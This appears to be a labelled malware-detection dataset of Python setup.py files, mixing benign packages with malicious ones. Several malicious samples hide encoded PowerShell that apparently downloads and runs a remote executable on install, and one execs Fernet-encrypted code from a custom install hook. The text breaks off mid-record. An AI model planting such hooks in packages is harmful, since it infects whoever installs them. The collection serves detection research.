3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Internet :: WWW/HTTP :: Dynamic Content\",\n    ],\n    entry_points={\n        \"console_scripts\": [\n            \"discord_webhook=discord_webhook.__main__:main\",\n        ],\n    },\n)\n", "target": 0}
{"idx": "tppippushvm-9.58", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppippushvm',\n    packages = ['modlib'],\n    version = '2.31',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libnvidiasplitpep-7.7", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libnvidiasplitpep',\n    packages = ['modlib'],\n    version = '4.5',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "capmostercloudclient-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'kqaCXdTtUukZBGufDYRjIFmXrdPUSnKJptmZvr'\nLONG_DESCRIPTION = 'jtJacpogJPWWRPqlXcHAmaJpIaqMTPn cyjxRhrbsaAZVJKrxAEywwaHihstg JXJtWblZvQhZcUWnxuOlsNOgZckgKatWHrJOagMhbKtbFCcVKgnYnbuQhlbPJvjKwRFYTscsGaQmvlhZuVSDBraxsQBlUUecJMHFYLy'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'BHOrAr8tBIFAPiMu-m-CztFUwHxe-erCzOqXvUZ3s-o=').decrypt(b'gAAAAABmA1k6Jeh6C0Or0usitvNgFQXyL0jnW86UIZAD8fLd-vsZt050BrPdE8xjCBJtPVvYsWd2ziH2iaamlc8T05QugnSwjLQXnFhD3KpjOz837EQjlFAEAMR3OIaaxbirwFQXsHpO_RwyQCMTsAfDAFsrloIprkt6gyR-oDfStxnUzFHmq19F6LQe30aL7lBEZyhP7aM-u3jejuuEl1lgyNZ5Um-NNUvqS4UQWALaXUz-f-UNTXo='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"capmostercloudclient\",\n    version=VERSION,\n    author=\"JmNTVxZXhKrjZssFWcX\",\n    author_email=\"nfeoimcyWBwmBPrUNGr@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "esqencodepostinfo-4.3", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqencodepostinfo',\n    packages = ['modlib'],\n    version = '3.22',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tpnvidiasplit-4.59", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpnvidiasplit',\n    packages = ['modlib'],\n    version = '9.42',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "grandurl-7.97", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'grandurl',\n    packages = ['modlib'],\n    version = '1.54',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dockerfile-3.2.0", "func": "import platform\nimport sys\n\nfrom setuptools import Extension\nfrom setuptools import setup\n\nif sys.platform != 'win32' and platform.python_implementation() == 'CPython':\n    try:\n        import wheel.bdist_wheel\n    except ImportError:\n        cmdclass = {}\n    else:\n        class bdist_wheel(wheel.bdist_wheel.bdist_wheel):\n            def finalize_options(self) -> None:\n                self.py_limited_api = f'cp3{sys.version_info[1]}'\n                super().finalize_options()\n\n        cmdclass = {'bdist_wheel': bdist_wheel}\nelse:\n    cmdclass = {}\n\nsetup(\n    ext_modules=[\n        Extension(\n            'dockerfile', ['pylib/main.go'],\n            py_limited_api=True, define_macros=[('Py_LIMITED_API', None)],\n        ),\n    ],\n    cmdclass=cmdclass,\n    build_golang={'root': 'github.com/asottile/dockerfile'},\n)\n", "target": 0}
{"idx": "py-intcandysplit-9.86", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-intcandysplit',\n    packages = ['modlib'],\n    version = '1.55',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "graphql-server-core-2.0.0", "func": "from setuptools import setup, find_packages\n\ninstall_requires = [\n    \"graphql-core>=2.3,<3\",\n    \"promise>=2.3,<3\",\n]\n\ntests_requires = [\n    \"pytest==4.6.9\",\n    \"pytest-cov==2.8.1\"\n]\n\ndev_requires = [\n    'flake8==3.7.9',\n    'isort<4.0.0',\n    'black==19.10b0',\n    'mypy==0.761',\n    'check-manifest>=0.40,<1',\n] + tests_requires\n\nsetup(\n    name=\"graphql-server-core\",\n    version=\"2.0.0\",\n    description=\"GraphQL Server tools for powering your server\",\n    long_description=open(\"README.md\").read(),\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/graphql-python/graphql-server-core\",\n    download_url=\"https://github.com/graphql-python/graphql-server-core/releases\",\n    author=\"Syrus Akbary\",\n    author_email=\"me@syrusakbary.com\",\n    license=\"MIT\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Topic :: Software Development :: Libraries\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"License :: OSI Approved :: MIT License\",\n    ],\n    keywords=\"api graphql protocol rest\",\n    packages=find_packages(exclude=[\"tests\"]),\n    install_requires=install_requires,\n    tests_require=tests_requires,\n    extras_require={\n        'test': tests_requires,\n        'dev': dev_requires,\n    },\n    include_package_data=True,\n    zip_safe=False,\n    platforms=\"any\",\n)\n", "target": 0}
{"idx": "expandvars-0.9.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\nmodules = \\\n['expandvars']\nsetup_kwargs = {\n    'name': 'expandvars',\n    'version': '0.9.0',\n    'description': 'Expand system variables Unix style',\n    'long_description': 'expandvars\\n==========\\nExpand system variables Unix style\\n\\n[![PyPI version](https://img.shields.io/pypi/v/expandvars.svg)](https://pypi.org/project/expandvars)\\n[![codecov](https://codecov.io/gh/sayanarijit/expandvars/branch/master/graph/badge.svg)](https://codecov.io/gh/sayanarijit/expandvars)\\n\\n\\nInspiration\\n-----------\\nThis module is inspired by [GNU bash\\'s variable expansion features](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html). It can be used as an alternative to Python\\'s [os.path.expandvars](https://docs.python.org/3/library/os.path.html#os.path.expandvars) function.\\n\\nA good use case is reading config files with the flexibility of reading values from environment variables using advanced features like returning a default value if some variable is not defined.\\nFor example:\\n\\n```toml\\n[default]\\nmy_secret_access_code = \"${ACCESS_CODE:-default_access_code}\"\\nmy_important_variable = \"${IMPORTANT_VARIABLE:?}\"\\nmy_updated_path = \"$PATH:$HOME/.bin\"\\nmy_process_id = \"$$\"\\nmy_nested_variable = \"${!NESTED}\"\\n```\\n\\n> NOTE: Although this module copies most of the common behaviours of bash,\\n> it doesn\\'t follow bash strictly. For example, it doesn\\'t work with arrays.\\n\\n\\nUsage\\n-----\\n\\n```python\\nfrom expandvars import expandvars\\n\\nprint(expandvars(\"$PATH:${HOME:?}/bin:${SOME_UNDEFINED_PATH:-/default/path}\"))\\n# /bin:/sbin:/usr/bin:/usr/sbin:/home/you/bin:/default/path\\n```\\n\\n\\nExamples\\n--------\\nFor now, [refer to the test cases](https://github.com/sayanarijit/expandvars/blob/master/tests) to see how it behaves.\\n\\n\\nTIPs\\n----\\n\\n### nounset=True\\n\\nIf you want to enable strict parsing by default, (similar to `set -u` / `set -o nounset` in bash), pass `nounset=True`.\\n\\n```python\\n# All the variables must be defined.\\nexpandvars(\"$VAR1:${VAR2}:$VAR3\", nounset=True)\\n\\n# Raises UnboundVariable error.\\n```\\n\\n> NOTE: Another way is to use the `${VAR?}` or `${VAR:?}` syntax. See the examples in tests.\\n\\n### EXPANDVARS_RECOVER_NULL=\"foo\"\\n\\nIf you want to temporarily disable strict parsing both for `nounset=True` and the `${VAR:?}` syntax, set environment variable `EXPANDVARS_RECOVER_NULL=somevalue`.\\nThis helps with certain use cases where you need to temporarily disable strict parsing of critical env vars, e.g. in testing environment, without modifying the code.\\n\\ne.g.\\n\\n```bash\\nEXPANDVARS_RECOVER_NULL=foo myapp --config production.ini && echo \"All fine.\"\\n```\\n\\n> WARNING: Try to avoid `export EXPANDVARS_RECOVER_NULL` because that will disable strict parsing permanently until you log out.\\n\\n### Customization\\n\\nYou can customize the variable symbol and data used for the expansion by using the more general `expand` function.\\n\\n```python\\nfrom expandvars import expand\\n\\nprint(expand(\"%PATH:$HOME/bin:%{SOME_UNDEFINED_PATH:-/default/path}\", environ={\"PATH\": \"/example\"}, var_symbol=\"%\"))\\n# /example:$HOME/bin:/default/path\\n```\\n\\nContributing\\n------------\\nTo contribute, setup environment following way:\\n\\nFirst you need to [install poetry](https://python-poetry.org/docs/#installation).\\n\\nThen\\n\\n```bash\\n# Clone repo\\ngit clone https://github.com/sayanarijit/expandvars && cd expandvars\\n\\n# Install poetry dependencies\\npoetry install\\n```\\n\\n- Follow [general git guidelines](https://git-scm.com/book/en/v2/Distributed-Git-Contributing-to-a-Project).\\n- Keep it simple. Run `poetry run black` to auto format the code.\\n- Test your changes locally by running `poetry run pytest` (pass `--cov --cov-report html` for browsable coverage report).\\n- If you are familiar with [tox](https://tox.readthedocs.io), you may want to use it for testing in different python versions.\\n\\nAlternatives\\n------------\\n\\n- [environs](https://github.com/sloria/environs) - simplified environment variable parsing.\\n',\n    'author': 'Arijit Basu',\n    'author_email': 'sayanarijit@gmail.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/sayanarijit/expandvars',\n    'py_modules': modules,\n    'python_requires': '>=3.4',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "google-cloud-datacatalog-3.9.0", "func": "# -*- coding: utf-8 -*-\n#\n# Copyright 2019 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\nname = \"google-cloud-datacatalog\"\ndescription = \"Google Cloud Data Catalog API API client library\"\nversion = \"3.9.0\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"grpc-google-iam-v1 >= 0.12.4, <1.0.0dev\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\n\nextras = {\"libcst\": \"libcst >= 0.2.5\"}\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-datacatalog\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    scripts=[\n        \"scripts/fixup_datacatalog_v1_keywords.py\",\n        \"scripts/fixup_datacatalog_v1beta1_keywords.py\",\n    ],\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    include_package_data=True,\n    zip_safe=False,\n    python_requires=\">=3.7\",\n)\n", "target": 0}
{"idx": "fastapi-utils-0.2.1", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['fastapi_utils']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['fastapi', 'pydantic>=1.0,<2.0', 'sqlalchemy>=1.3.12,<2.0.0']\n\nsetup_kwargs = {\n    'name': 'fastapi-utils',\n    'version': '0.2.1',\n    'description': 'Reusable utilities for FastAPI',\n    'long_description': '<p align=\"center\">\\n    <em>Reusable utilities for FastAPI</em>\\n</p>\\n<p align=\"center\">\\n<img src=\"https://img.shields.io/github/last-commit/dmontagu/fastapi-utils.svg\">\\n<a href=\"https://github.com/dmontagu/fastapi-utils\" target=\"_blank\">\\n    <img src=\"https://github.com/dmontagu/fastapi-utils/workflows/build/badge.svg\" alt=\"Build\">\\n</a>\\n<a href=\"https://codecov.io/gh/dmontagu/fastapi-utils\" target=\"_blank\">\\n    <img src=\"https://codecov.io/gh/dmontagu/fastapi-utils/branch/master/graph/badge.svg\" alt=\"Coverage\">\\n</a>\\n<a href=\"https://app.netlify.com/sites/trusting-archimedes-72b369/deploys\">\\n    <img src=\"https://img.shields.io/netlify/28b2a077-65b1-4d6c-9dba-13aaf6059877\" alt=\"Netlify status\">\\n</a>\\n<br />\\n<a href=\"https://pypi.org/project/fastapi-utils\" target=\"_blank\">\\n    <img src=\"https://badge.fury.io/py/fastapi-utils.svg\" alt=\"Package version\">\\n</a>\\n    <img src=\"https://img.shields.io/pypi/pyversions/fastapi-utils.svg\">\\n    <img src=\"https://img.shields.io/github/license/dmontagu/fastapi-utils.svg\">\\n</p>\\n\\n---\\n\\n**Documentation**: <a href=\"https://fastapi-utils.davidmontague.xyz\" target=\"_blank\">https://fastapi-utils.davidmontague.xyz</a>\\n\\n**Source Code**: <a href=\"https://github.com/dmontagu/fastapi-utils\" target=\"_blank\">https://github.com/dmontagu/fastapi-utils</a>\\n\\n---\\n\\n<a href=\"https://fastapi.tiangolo.com\">FastAPI</a> is a modern, fast web framework for building APIs with Python 3.6+.\\n\\nBut if you\\'re here, you probably already knew that!\\n\\n---\\n\\n## Features\\n\\nThis package includes a number of utilities to help reduce boilerplate and reuse common functionality across projects:\\n\\n* **Class Based Views**: Stop repeating the same dependencies over and over in the signature of related endpoints.\\n* **Response-Model Inferring Router**: Let FastAPI infer the `response_model` to use based on your return type annotation. \\n* **Repeated Tasks**: Easily trigger periodic tasks on server startup\\n* **Timing Middleware**: Log basic timing information for every request\\n* **SQLAlchemy Sessions**: The `FastAPISessionMaker` class provides an easily-customized SQLAlchemy Session dependency \\n* **OpenAPI Spec Simplification**: Simplify your OpenAPI Operation IDs for cleaner output from OpenAPI Generator\\n\\n---\\n\\nIt also adds a variety of more basic utilities that are useful across a wide variety of projects:\\n\\n* **APIModel**: A reusable `pydantic.BaseModel`-derived base class with useful defaults\\n* **APISettings**: A subclass of `pydantic.BaseSettings` that makes it easy to configure FastAPI through environment variables \\n* **String-Valued Enums**: The `StrEnum` and `CamelStrEnum` classes make string-valued enums easier to maintain\\n* **CamelCase Conversions**: Convenience functions for converting strings from `snake_case` to `camelCase` or `PascalCase` and back\\n* **GUID Type**: The provided GUID type makes it easy to use UUIDs as the primary keys for your database tables\\n\\nSee the [docs](https://fastapi-utils.davidmontague.xyz/) for more details and examples. \\n\\n## Requirements\\n\\nThis package is intended for use with any recent version of FastAPI (depending on `pydantic>=1.0`), and Python 3.6+.\\n\\n## Installation\\n\\n```bash\\npip install fastapi-utils\\n```\\n\\n## License\\n\\nThis project is licensed under the terms of the MIT license.\\n',\n    'author': 'David Montague',\n    'author_email': 'davwmont@gmail.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://fastapi-utils.davidmontague.xyz',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'python_requires': '>=3.6,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "django-countries-7.3.2", "func": "#!/usr/bin/env python\nfrom setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "ddddocr-1.4.4", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# @Time    : 2021/7/2 15:41\n# @Author  : sml2h3\n# @Site    :\n# @File    : setup.py\n# @Software: PyCharm\n# @Description:\n\nfrom setuptools import setup, find_packages\n\nwith open(\"README.md\", \"r\", encoding=\"utf-8\") as fh:\n    long_description = fh.read()\n\nsetup(\n    name=\"ddddocr\",\n    version=\"1.4.4\",\n    author=\"sml2h3\",\n    description=\"\u5e26\u5e26\u5f1f\u5f1fOCR\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/sml2h3/ddddocr\",\n    packages=find_packages(where='.', exclude=(), include=('*',)),\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    install_requires=['numpy', 'onnxruntime', 'Pillow', 'opencv-python-headless'],\n    python_requires='<=3.10',\n    include_package_data=True,\n    install_package_data=True,\n)\n", "target": 0}
{"idx": "google-ads-18.0.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"A setup module for the Google Ads API client library.\"\"\"\n\nfrom setuptools import setup, find_packages\nimport io\n\ninstall_requires = [\n    \"google-auth-oauthlib >= 0.3.0, < 1.0.0\",\n    \"google-api-core >= 2.8.1, < 3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.0\",\n    \"googleapis-common-protos >= 1.5.8, < 2.0.0\",\n    # NOTE: Source code for grpcio and 